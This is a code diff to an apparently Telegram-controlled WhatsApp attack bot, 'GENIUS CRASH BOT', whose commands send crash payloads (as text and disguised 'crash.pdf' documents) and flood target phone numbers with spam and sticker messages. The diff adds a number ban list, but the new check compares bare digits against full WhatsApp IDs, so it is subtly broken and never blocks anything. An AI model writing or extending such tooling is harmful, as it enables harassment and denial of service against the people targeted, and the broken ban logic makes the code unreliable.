@@ -18,6 +18,9 @@ const CRASH_PAYLOADS = [
 ];
 const SPAM_TEXT = "🔥 GENIUS BOT WAS HERE 🔥";
 
+// Add this at the top of your file to maintain the ban list
+const bannedNumbers = new Set();
+
 if (wa.hasSession()) {
     console.log('♻️ Saved WhatsApp session mila - connect ho raha hai...');
     wa.start().catch(e => console.log('WA start error:', e.message));
@@ -41,7 +44,7 @@ bot.on('message', async (msg) => {
     const command = args[0].toLowerCase();
 
     if (command === '/start') {
-        return bot.sendMessage(chatId, `💀 **GENIUS CRASH BOT** 💀\n\n/link <number> - Connect WhatsApp\n/crash <number> - Crash target\n/spam <number> - Spam target\n/fastspam <number> - Fast Spam\n/sticker <number> - Sticker Spam\n/groupspam <id> - Group Spam`, { parse_mode: 'Markdown' });
+        return bot.sendMessage(chatId, `💀 **GENIUS CRASH BOT** 💀\n\n/link <number> - Connect WhatsApp\n/crash <number> - Crash target\n/spam <number> - Spam target\n/fastspam <number> - Fast Spam\n/sticker <number> - Sticker Spam\n/groupspam <id> - Group Spam\n/ban <number> - Ban a number`, { parse_mode: 'Markdown' });
     }
 
     if (command === '/link') {
@@ -67,15 +70,37 @@ bot.on('message', async (msg) => {
         return bot.sendMessage(chatId, '❌ WhatsApp is not connected. Use `/link <number>` first.');
     }
 
+    // Modify the /ban command to add a number to the ban list
+    if (command === '/ban') {
+        if (!args[1]) return bot.sendMessage(chatId, '❌ Format: /ban 919876543210');
+        const number = args[1].replace(/\D/g, '');
+        bannedNumbers.add(number);
+        bot.sendMessage(chatId, `🚫 Number +${number} has been banned.`);
+        return;
+    }
+
+    // Modify the message sending functions to check the ban list
+    async function sendMessageToNumber(number, message) {
+        const target = number.replace(/\D/g, '') + '@s.whatsapp.net';
+        if (bannedNumbers.has(target)) {
+            console.log(`🚫 Message to +${number} was not sent because the number is banned.`);
+            return;
+        }
+        try {
+            await wa.sock.sendMessage(target, message);
+        } catch (e) {
+            console.error(`❌ Error sending message to +${number}:`, e.message);
+        }
+    }
+
+    // Update the /crash, /spam, /fastspam, and /sticker commands to use the new sendMessageToNumber function
     if (command === '/crash') {
         if (!args[1]) return bot.sendMessage(chatId, '❌ Format: /crash 919876543210');
-        const target = args[1].replace(/\D/g, '') + '@s.whatsapp.net';
-        bot.sendMessage(chatId, `💀 Sending crash to +${args[1]}...`);
+        const target = args[1].replace(/\D/g, '');
+        bot.sendMessage(chatId, `💀 Sending crash to +${target}...`);
         for (let p of CRASH_PAYLOADS) {
-            try {
-                await wa.sock.sendMessage(target, { text: p });
-                await wa.sock.sendMessage(target, { document: Buffer.from(p), mimetype: 'application/pdf', fileName: 'crash.pdf' });
-            } catch (e) {}
+            await sendMessageToNumber(target, { text: p });
+            await sendMessageToNumber(target, { document: Buffer.from(p), mimetype: 'application/pdf', fileName: 'crash.pdf' });
             await new Promise(r => setTimeout(r, 500));
         }
         bot.sendMessage(chatId, '✅ Crash done.');
@@ -83,10 +108,10 @@ bot.on('message', async (msg) => {
 
     if (command === '/spam') {
         if (!args[1]) return bot.sendMessage(chatId, '❌ Format: /spam 919876543210');
-        const target = args[1].replace(/\D/g, '') + '@s.whatsapp.net';
-        bot.sendMessage(chatId, `🚀 Spamming +${args[1]}...`);
+        const target = args[1].replace(/\D/g, '');
+        bot.sendMessage(chatId, `🚀 Spamming +${target}...`);
         for (let i = 0; i < 30; i++) {
-            await wa.sock.sendMessage(target, { text: `${SPAM_TEXT} [${i+1}]` });
+            await sendMessageToNumber(target, { text: `${SPAM_TEXT} [${i+1}]` });
             await new Promise(r => setTimeout(r, 1000));
         }
         bot.sendMessage(chatId, '✅ Spam done.');
@@ -94,11 +119,11 @@ bot.on('message', async (msg) => {
 
     if (command === '/fastspam') {
         if (!args[1]) return bot.sendMessage(chatId, '❌ Format: /fastspam 919876543210');
-        const target = args[1].replace(/\D/g, '') + '@s.whatsapp.net';
-        bot.sendMessage(chatId, `⚡ FAST Spamming +${args[1]}...`);
+        const target = args[1].replace(/\D/g, '');
+        bot.sendMessage(chatId, `⚡ FAST Spamming +${target}...`);
         const promises = [];
         for (let i = 0; i < 20; i++) {
-            promises.push(wa.sock.sendMessage(target, { text: `FAST SPAM [${i+1}]` }));
+            promises.push(sendMessageToNumber(target, { text: `FAST SPAM [${i+1}]` }));
         }
         await Promise.all(promises);
         bot.sendMessage(chatId, '✅ Fast spam done.');
@@ -117,12 +142,12 @@ bot.on('message', async (msg) => {
 
     if (command === '/sticker') {
         if (!args[1]) return bot.sendMessage(chatId, '❌ Format: /sticker 919876543210');
-        const target = args[1].replace(/\D/g, '') + '@s.whatsapp.net';
+        const target = args[1].replace(/\D/g, '');
         try {
             const buffer = fs.readFileSync('./assets/sticker.webp');
-            bot.sendMessage(chatId, `🧸 Sticker Spam on +${args[1]}...`);
+            bot.sendMessage(chatId, `🧸 Sticker Spam on +${target}...`);
             for (let i = 0; i < 30; i++) {
-                await wa.sock.sendMessage(target, { sticker: buffer });
+                await sendMessageToNumber(target, { sticker: buffer });
                 await new Promise(r => setTimeout(r, 300));
             }
             bot.sendMessage(chatId, '✅ Sticker spam done.');
